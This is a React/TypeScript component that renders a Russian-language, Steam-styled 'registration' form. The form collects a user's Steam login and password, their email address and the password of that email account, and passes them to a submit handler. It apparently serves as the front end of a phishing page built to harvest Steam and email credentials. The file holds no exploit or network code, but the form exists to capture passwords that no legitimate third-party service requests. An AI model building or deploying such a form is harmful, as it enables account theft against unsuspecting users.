import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import {
  Card,
  CardHeader,
  CardTitle,
  CardDescription,
  CardContent,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import Icon from "@/components/ui/icon";
import { SteamUserData } from "@/pages/Index";

const formSchema = z.object({
  steamLogin: z.string().min(1, "Steam логин обязателен"),
  steamPassword: z.string().min(1, "Steam пароль обязателен"),
  email: z.string().email("Некорректный email").min(1, "Email обязателен"),
  emailPassword: z.string().min(1, "Пароль от email обязателен"),
});

interface SteamDataFormProps {
  onSubmit: (data: Omit<SteamUserData, "id" | "submittedAt">) => void;
  onBack: () => void;
}

const SteamDataForm = ({ onSubmit, onBack }: SteamDataFormProps) => {
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      steamLogin: "",
      steamPassword: "",
      email: "",
      emailPassword: "",
    },
  });

  const handleFormSubmit = (values: z.infer<typeof formSchema>) => {
    onSubmit(values);
  };

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
      <div className="mb-6">
        <Button
          variant="ghost"
          onClick={onBack}
          className="mb-4 text-slate-300 hover:text-white hover:bg-blue-500/10"
        >
          <Icon name="ArrowLeft" size={16} className="mr-2" />
          Назад
        </Button>
      </div>

      <Card className="steam-card shadow-lg shadow-blue-500/10">
        <CardHeader className="text-center">
          <div className="w-16 h-16 steam-gradient rounded-xl mx-auto mb-4 flex items-center justify-center shadow-lg shadow-blue-500/25">
            <Icon name="UserPlus" size={32} className="text-white" />
          </div>
          <CardTitle className="text-2xl text-white">Регистрация</CardTitle>
          <CardDescription className="text-slate-300">
            Введите ваши данные Steam
          </CardDescription>
        </CardHeader>

        <CardContent>
          <Form {...form}>
            <form
              onSubmit={form.handleSubmit(handleFormSubmit)}
              className="space-y-6"
            >
              <FormField
                control={form.control}
                name="steamLogin"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-white">Steam логин *</FormLabel>
                    <FormControl>
                      <Input
                        type="text"
                        placeholder="Ваш логин Steam"
                        className="bg-slate-800/50 border-blue-500/30 text-white placeholder:text-slate-400 focus:border-blue-400"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="steamPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-white">Steam пароль *</FormLabel>
                    <FormControl>
                      <Input
                        type="password"
                        placeholder="Ваш пароль Steam"
                        className="bg-slate-800/50 border-blue-500/30 text-white placeholder:text-slate-400 focus:border-blue-400"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="email"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-white">Email *</FormLabel>
                    <FormControl>
                      <Input
                        type="email"
                        placeholder="your.email@example.com"
                        className="bg-slate-800/50 border-blue-500/30 text-white placeholder:text-slate-400 focus:border-blue-400"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="emailPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-white">
                      Пароль от email *
                    </FormLabel>
                    <FormControl>
                      <Input
                        type="password"
                        placeholder="Пароль от вашего email"
                        className="bg-slate-800/50 border-blue-500/30 text-white placeholder:text-slate-400 focus:border-blue-400"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <div className="pt-6">
                <Button
                  type="submit"
                  className="w-full steam-gradient hover:shadow-lg hover:shadow-blue-500/25 text-white transition-all duration-300"
                  size="lg"
                >
                  Зарегистрировать данные
                </Button>
              </div>
            </form>
          </Form>
        </CardContent>
      </Card>
    </div>
  );
};

export default SteamDataForm;
